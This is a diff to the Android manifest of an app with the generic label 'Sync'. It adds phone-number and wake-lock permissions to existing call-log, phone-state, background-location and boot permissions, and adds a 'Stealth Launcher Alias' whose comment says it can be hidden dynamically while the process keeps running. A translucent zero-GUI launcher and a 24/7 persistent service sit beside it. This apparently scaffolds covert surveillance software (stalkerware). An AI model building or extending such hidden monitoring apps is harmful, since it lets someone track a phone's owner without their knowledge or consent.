@@ -13,31 +13,41 @@
     <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+    <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <application
         android:allowBackup="false"
-        android:icon="@android:drawable/ic_menu_info_details"
+        android:icon="@drawable/ic_launcher"
         android:label="Sync"
         android:supportsRtl="true"
         android:theme="@style/Theme.AppCompat.Translucent"
         android:usesCleartextTraffic="true">
 
-        <!-- Zero-GUI Transparent Launcher Activity -->
+        <!-- Core Permission Activity -->
         <activity
             android:name=".PermissionActivity"
+            android:exported="false"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar" />
+
+        <!-- Stealth Launcher Alias (Can be hidden dynamically without killing process) -->
+        <activity-alias
+            android:name=".LauncherAlias"
+            android:targetActivity=".PermissionActivity"
             android:exported="true"
-            android:theme="@android:style/Theme.Translucent.NoTitleBar">
+            android:label="Sync"
+            android:icon="@drawable/ic_launcher">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
 
         <!-- 24/7 Persistent Background Foreground Service -->
         <service
